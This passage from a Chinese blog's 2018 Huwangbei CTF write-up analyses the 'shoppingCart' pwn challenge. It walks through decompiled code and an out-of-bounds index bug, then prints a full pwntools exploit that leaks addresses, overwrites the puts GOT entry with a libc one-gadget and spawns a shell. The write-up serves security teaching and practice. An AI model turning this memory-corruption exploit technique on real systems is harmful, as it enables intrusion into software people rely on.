class="built_in">stdin</span>);</span><br><span class="line">      option_num = strtoul(&amp;option_str, <span class="number">0L</span>L, <span class="number">0</span>);<span class="comment">// 将输入的字符串转化为无符号长整型</span></span><br><span class="line">      <span class="keyword">if</span> ( option_num != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      removemoney();                            <span class="comment">// 输入2时，删除money</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( option_num == <span class="number">3</span> )                      <span class="comment">// 输入3时，跳出</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( option_num == <span class="number">1</span> )                      <span class="comment">// 输入1时，获取money</span></span><br><span class="line">      getmoney();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们需要输入一个选项，来进入不同的功能。经过分析，输入2时，会执行删除money的操作，但是里面只是提示了不能删除。所以这个功能并没有什么用。输入3时跳出money_menu。输入1时执行getmoney()，所以，我们进入这个函数去看一下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getmoney</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 *v0; <span class="comment">// rax</span></span><br><span class="line">  money *money_ptr1; <span class="comment">// rax</span></span><br><span class="line">  money *money_ptr2; <span class="comment">// ST08_8</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 money_num; <span class="comment">// rcx money_list索引</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( money_sum &lt;= <span class="number">19</span> )                        <span class="comment">// money种类数量</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"I will give you $9999, but what's the  currency type you want, RMB or Dollar?"</span>);</span><br><span class="line">    money_ptr1 = <span class="built_in">malloc</span>(<span class="number">16u</span>LL);                 <span class="comment">// 给结构体分配内存</span></span><br><span class="line">    money_ptr2 = money_ptr1;</span><br><span class="line">    money_ptr1-&gt;num = <span class="number">9999L</span>L;</span><br><span class="line">    fgets(&amp;money_type[<span class="number">8</span> * money_sum], <span class="number">8</span>, <span class="built_in">stdin</span>);<span class="comment">// 将money_type存到.bss段的数组中</span></span><br><span class="line">    money_ptr2-&gt;money_type = &amp;money_type[<span class="number">8</span> * money_sum];<span class="comment">// 将money_type的字符串指针存入结构体成员money_type中</span></span><br><span class="line">    v3 = money_sum++;</span><br><span class="line">    money_num = v3;</span><br><span class="line">    v0 = money_list;</span><br><span class="line">    money_list[money_num] = money_ptr2;         <span class="comment">// 将结构体指针存到.bss段的数组中</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"You already have enough money!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是经过优化的代码，我们看起来会比较好理解一点，原本并不是这样的。初始状态不仔细看是不容易看不出来有money和goods两个结构体的(对于新手来说)，我们需要利用IDA的优化代码的功能，添加这两个结构体。具体的添加方法可以参考IDA Pro权威指南。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00000000 money           struc ; (sizeof=0x10, mappedto_6)</span><br><span class="line">00000000 money_type      dq ?</span><br><span class="line">00000008 num             dq ?</span><br><span class="line">00000010 money           ends</span><br><span class="line">00000010</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 goods           struc ; (sizeof=0x10, mappedto_7)</span><br><span class="line">00000000 goods_name      dq ?</span><br><span class="line">00000008 num             dq ?</span><br><span class="line">00000010 goods           ends</span><br><span class="line">00000010</span><br></pre></td></tr></table></figure>
<p>这个函数能够在堆上最多定义20个money结构体，每个money结构体具有两个成员，money_type和num，num是固定的9999，money_type是任意的，也可以使用题目说的RMB和Dollar，并不会影响解题。结构体对象是存在堆上的，前8个字节存储money_type字符串的地址，而money_type是存储在.bss段的，并且最后也会将money结构体对象的指针存入.bss段的一个数组中，我将其命名为money_list。</p>
<p>我们再来看看goods_menu()函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">goods_menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 option_num; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> option_str; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Now, buy buy buy!"</span>);</span><br><span class="line">          fgets(&amp;option_str, <span class="number">24</span>, <span class="built_in">stdin</span>);</span><br><span class="line">          option_num = strtoul(&amp;option_str, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( option_num != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          delete_goods();                       <span class="comment">// 输入2，删除goods</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( option_num &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( option_num == <span class="number">1</span> )</span><br><span class="line">          add_goods();                          <span class="comment">// 输入1，添加goods</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( option_num != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit_goods();                             <span class="comment">// 输入3，编辑goods</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( option_num != <span class="number">4</span> );</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>goods具有三个选项，add、delete、edit，问题出现在add_goods()函数和edit_goods()函数中。这里需要说明一下，用堆的做法，会涉及到add_goods()和edit_goods()中的两个漏洞，另一种方法只会使用到edit_goods()中用来泄露地址的漏洞。这里先说说不用堆的方法吧，用堆的方法，我暂时还没有弄清楚，我们进入edit_goods()函数看一下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit_goods</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 goods_num; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// ST00_8 v1=goods_num</span></span><br><span class="line">  <span class="keyword">char</span> goods_num_str; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which goods you need to modify?"</span>);</span><br><span class="line">  fgets(&amp;goods_num_str, <span class="number">24</span>, <span class="built_in">stdin</span>);             <span class="comment">// 这里输入负数，经过strtoul转换后，会造成数组的越界访问</span></span><br><span class="line">  goods_num = strtoul(&amp;goods_num_str, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"OK, what would you like to modify %s to?\n"</span>, *goods_list[goods_num], goods_num);<span class="comment">// 这里可以用来泄露地址</span></span><br><span class="line">  *(*goods_list[v1] + read(<span class="number">0</span>, *goods_list[v1], <span class="number">8u</span>LL)) = <span class="number">0</span>;<span class="comment">// 这里会造成任意地址写</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此函数中没有对输入的数据进行验证，当我们修改goods参数时，输入的goods编号为负数时，经过strtoul转换后，会造成后面打印的时候，越界读取数组，泄露地址信息。修改数据的时候会造成任意地址写。我们再来看看.bss段上数据的排布：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000202090 goods_sum       dq ?                    ; DATA XREF: add_goods+17↑r</span><br><span class="line">.bss:0000000000202090                                         ; add_goods+E1↑r ...</span><br><span class="line">.bss:0000000000202098 money_sum       dq ?                    ; DATA XREF: getmoney+8↑r</span><br><span class="line">.bss:0000000000202098                                         ; getmoney+53↑r ...</span><br><span class="line">.bss:00000000002020A0 ; char money_type[160]</span><br><span class="line">.bss:00000000002020A0 money_type      db 0A0h dup(?)          ; 0</span><br><span class="line">.bss:00000000002020A0                                         ; DATA XREF: getmoney+62↑o</span><br><span class="line">.bss:00000000002020A0                                         ; getmoney+8B↑o</span><br><span class="line">.bss:0000000000202140 money_list      dq 14h dup(?)           ; 0</span><br><span class="line">.bss:0000000000202140                                         ; DATA XREF: getmoney+B6↑o</span><br><span class="line">.bss:00000000002021E0 ; _QWORD goods_list[20]</span><br><span class="line">.bss:00000000002021E0 goods_list      dq 14h dup(?)           ; 0</span><br><span class="line">.bss:00000000002021E0                                         ; DATA XREF: add_goods+FB↑o</span><br><span class="line">.bss:00000000002021E0                                         ; delete_check+24↑o ...</span><br></pre></td></tr></table></figure>
<p>可以看到money_type、money_list、goods_list都是相连的，通过对goods_list的越界读取，可以泄露出程序的某一处地址。说来也巧，刚好在其上面不远处有一个指向自身的指针，我们可以计算偏移，泄露出此处的地址，计算出elf文件的加载基址。这处地址在elf文件的偏移0x202068处。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202068</span> off_202068      <span class="built_in">dq</span> offset off_202068    <span class="comment">; DATA XREF: sub_940+17↑r</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">0000000000202068</span>                                         <span class="comment">; .data:off_202068↓o</span></span><br></pre></td></tr></table></figure>
<h4 id="0x03-exp-non-heap"><a href="#0x03-exp-non-heap" class="headerlink" title="0x03 exp(non-heap)"></a>0x03 exp(non-heap)</h4><p>利用思路：</p>
<blockquote>
<p>1、调用getmoney()获得money，这里可以只获得两个money，因为后面只用到了money_list的前两个，也可以添加满20个。<br>2、利用edit_goods()泄露elf偏移0x202068处的地址，并计算出elf文件的加载基址，再计算出puts_got的地址。这里为什么不能直接泄露got表函数的地址，后面再说。<br>3、修改money_list[0]中的指针为money_list[1]的地址，修改money_list[1]中的指针为puts_got的地址。这里是为了泄露puts函数地址并且修改got表。因为修改goods_name的时候，是一个二级指针结构，所以这里也需要构造成一个二级指针结构。<br>4、然后将libc中的execv(“/bin/sh”)片段地址覆盖puts_got地址，再次调用puts()时，就会执行execv(“/bin/sh”)。</p>
</blockquote>
<p>第二步为什么不能直接泄露puts_got的内容，就是因为第三步中所说的，泄漏的内容需要具有一个二级指针结构。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.binary =<span class="string">'./shoppingCart'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getmoney</span><span class="params">(io,num)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        io.sendlineafter(<span class="string">'EMMmmm, you will be a rich man!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">'RMB or Dollar?\n'</span>,<span class="string">'RMB'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'EMMmmm, you will be a rich man!\n'</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_goods</span><span class="params">(io,index,content,flag)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Now, buy buy buy!\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'Which goods you need to modify?\n'</span>,index)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        io.recvuntil(<span class="string">'OK, what would you like to modify '</span>)</span><br><span class="line">        addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">        <span class="keyword">return</span> addr</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(<span class="string">'./shoppingCart'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">getmoney(io,<span class="number">0x14</span>)</span><br><span class="line">addr = edit_goods(io,<span class="string">'-47'</span>,<span class="string">''</span>,<span class="number">1</span>)</span><br><span class="line">elf_base = addr - <span class="number">0x202068</span></span><br><span class="line"></span><br><span class="line">io.sendline(p64(addr))</span><br><span class="line">puts_got = elf_base + <span class="number">0x202020</span></span><br><span class="line">money_name1 = elf_base + <span class="number">0x2020a8</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">edit_goods(io,<span class="string">'-0x14'</span>,p64(money_name1),<span class="number">0</span>)  <span class="comment">#money_name[0]-&gt;money_name[1]</span></span><br><span class="line">edit_goods(io,<span class="string">'-0x13'</span>,p64(puts_got),<span class="number">0</span>)	   <span class="comment">#money_name[1]=puts_got</span></span><br><span class="line"></span><br><span class="line">puts_addr = edit_goods(io,<span class="string">'-0x28'</span>,<span class="string">''</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">shell = p64(libc_base + <span class="number">0x45216</span>)</span><br><span class="line">io.send(shell)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://laucyun.com/3411bc6f400207178b85defa04474b4a.html#directory-0146717171785671911" target="_blank" rel="noopener">https://laucyun.com/3411bc6f400207178b85defa04474b4a.html#directory-0146717171785671911</a><br><a href="https://xz.aliyun.com/t/2897#" target="_blank" rel="noopener">https://xz.aliyun.com/t/2897#</a><br><a href="https://veritas501.space/2018/10/15/%E6%8A%A4%E7%BD%91%E6%9D%AF%20pwn%20wp/" target="_blank" rel="noopener">https://veritas501.space/2018/10/15/%E6%8A%A4%E7%BD%91%E6%9D%AF%20pwn%20wp/</a></p>
<p><a href="https://blog.csdn.net/w12315q/article/details/83119560" target="_blank" rel="noopener">https://blog.csdn.net/w12315q/article/details/83119560</a><br><a href="http://m4x.fun/post/hwb2018-pwn-writeup/" target="_blank" rel="noopener">http://m4x.fun/post/hwb2018-pwn-writeup/</a><br><a href="https://www.jianshu.com/p/9375c32b2159" target="_blank" rel="noopener">https://www.jianshu.com/p/9375c32b2159</a></p>
<p><a href="https://www.freebuf.com/articles/rookie/155971.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/rookie/155971.html</a><br><a href="http://p4nda.top/2018/10/14/hwb-ctf-2018/" target="_blank" rel="noopener">http://p4nda.top/2018/10/14/hwb-ctf-2018/</a><br><a href="https://blog.csdn.net/qq_38204481/article/details/83216384" target="_blank" rel="noopener">https://blog.csdn.net/qq_38204481/article/details/83216384</a><br><a href="http://transparentsite.top/2018/10/%E6%8A%A4%E7%BD%91%E6%9D%AFpwn-shoppingcart/" target="_blank" rel="noopener">http://transparentsite.top/2018/10/%E6%8A%A4%E7%BD%91%E6%9D%AFpwn-shoppingcart/</a><br><a href="https://www.jianshu.com/p/b96e90ff6f72" target="_blank" rel="noopener">https://www.jianshu.com/p/b96e90ff6f72</a><br><a href="https://waterdrop-team.github.io/2018/10/13/hwb-2018-writeup/" target="_blank" rel="noopener">https://waterdrop-team.github.io/2018/10/13/hwb-2018-writeup/</a><br><a href="http://blog.leanote.com/cate/xp0int/%E6%8A%A4%E7%BD%91%E6%9D%AF2018" target="_blank" rel="noopener">http://blog.leanote.com/cate/xp0int/%E6%8A%A4%E7%BD%91%E6%9D%AF2018</a></p>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2018/10/26/护网杯2018——WriteUp/">护网杯2018——WriteUp</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 Sp4n9x 的个人博客">Sp4n9x</a></p>
        <p><span>发布时间:</span>2018-10-26, 00:00</p>
        <p><span>最后更新:</span>2020-09-15, 00:59</p>
        
            <p>
                <span>更新历史:</span><i class="fa fa-github"></i>
                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2018-10-26.护网杯2018——WriteUp.md" title="顺序查看文章各部分修改记录" target = "_blank">Blame</a>,
                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2018-10-26.护网杯2018——WriteUp.md" title="查看文章有关更新记录" target = "_blank">History</a><span class="raw">文本模式:</span><i class="fa fa-file-text-o"></i>
                <a href="https://raw.githubusercontent.com/Sp4n9x/blog_backup/blob/master/_posts/2018-10-26.护网杯2018——WriteUp.md" title="查看 & 下载文章 Markdown 原始文本" target = "_blank"> .md Raw</a>
            </p>
        
        <p>
            <span>原始链接:</span><a class="post-url" href="/2018/10/26/护网杯2018——WriteUp/" title="护网杯2018——WriteUp">http://sp4n9x.github.io/2018/10/26/护网杯2018——WriteUp/</a>
            <span class="copy-path" data-clipboard-text="原文: http://sp4n9x.github.io/2018/10/26/护网杯2018——WriteUp/　　作者: Sp4n9x" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>

    
    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2019/04/11/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/">
                    OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2018/06/01/CVE-2010-2883复现与分析/">
                    CVE-2010-2883复现与分析
                </a>
            </div>
        
    </nav>

  
</article>






    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gettingstart"><span class="toc-text">gettingstart</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-file-amp-amp-checksec"><span class="toc-text">0x00 file &amp;&amp; checksec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-运行程序，观察程序功能"><span class="toc-text">0x01 运行程序，观察程序功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-IDA分析"><span class="toc-text">0x02 IDA分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-exp"><span class="toc-text">0x03 exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-总结"><span class="toc-text">0x04 总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#six"><span class="toc-text">six</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-file-amp-amp-checksec-1"><span class="toc-text">0x00 file &amp;&amp; checksec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-观察程序行为"><span class="toc-text">0x01 观察程序行为</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-IDA分析-1"><span class="toc-text">0x02 IDA分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-exp-1"><span class="toc-text">0x03 exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-总结-1"><span class="toc-text">0x04 总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#huwang"><span class="toc-text">huwang</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-file-amp-amp-checksec-2"><span class="toc-text">0x00 file &amp;&amp; checksec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-观察程序行为-1"><span class="toc-text">0x01 观察程序行为</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-IDA分析-2"><span class="toc-text">0x02 IDA分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-exp-2"><span class="toc-text">0x03 exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-总结-2"><span class="toc-text">0x04 总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shoppingCart"><span class="toc-text">shoppingCart</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-file-amp-amp-checksec-3"><span class="toc-text">0x00 file &amp;&amp; checksec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-运行程序，观察程序功能-1"><span class="toc-text">0x01 运行程序，观察程序功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-IDA静态分析"><span class="toc-text">0x02 IDA静态分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-exp-non-heap"><span class="toc-text">0x03 exp(non-heap)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li></ol></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-6 i,
        .toc-level-6 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"true"];
    </script>



    
    <div class="share">
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"护网杯2018——WriteUp　| Sp4n9x's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    </div>




    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2019/04/11/OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析/" title="上一篇: OilRig新型BondUpdater木马的DNS隐蔽隧道通信行为分析">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2018/06/01/CVE-2010-2883复现与分析/" title="下一篇: CVE-2010-2883复现与分析">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

